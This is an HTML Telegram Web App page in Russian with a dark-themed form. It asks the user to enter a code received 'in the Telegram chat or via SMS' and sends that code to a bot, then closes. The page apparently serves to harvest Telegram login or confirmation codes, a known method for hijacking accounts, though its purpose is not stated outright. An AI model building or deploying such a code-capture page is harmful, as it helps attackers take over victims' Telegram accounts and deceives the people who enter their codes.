<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ввод кода</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #1c1c1d;
            color: white;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container { width: 90%; text-align: center; }
        input {
            width: 100%;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background: #2c2c2e;
            color: white;
            font-size: 20px;
            text-align: center;
            margin-bottom: 20px;
            outline: none;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #248bed;
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Введите код</h2>
        <p style="color: #8e8e93;">Код из чата Telegram или SMS</p>
        <input type="number" id="code_input" placeholder="00000" inputmode="numeric">
        <button id="send_btn">Подтвердить</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Развернуть на весь экран

        const btn = document.getElementById('send_btn');
        const input = document.getElementById('code_input');

        // Функция отправки
        function sendToBot() {
            const val = input.value.trim();
            if (val.length >= 4) {
                // ВАЖНО: sendData работает ТОЛЬКО если WebApp открыт через KeyboardButton
                // или если бот ожидает данные после нажатия Inline-кнопки
                tg.sendData(val); 
                tg.close();
            } else {
                alert("Введите корректный код");
            }
        }

        btn.addEventListener('click', sendToBot);

        // Также дублируем на кнопку в интерфейсе самого Telegram (нижняя панель)
        tg.MainButton.setText("ОТПРАВИТЬ");
        tg.MainButton.show();
        tg.onEvent('mainButtonClicked', sendToBot);
    </script>
</body>
</html>
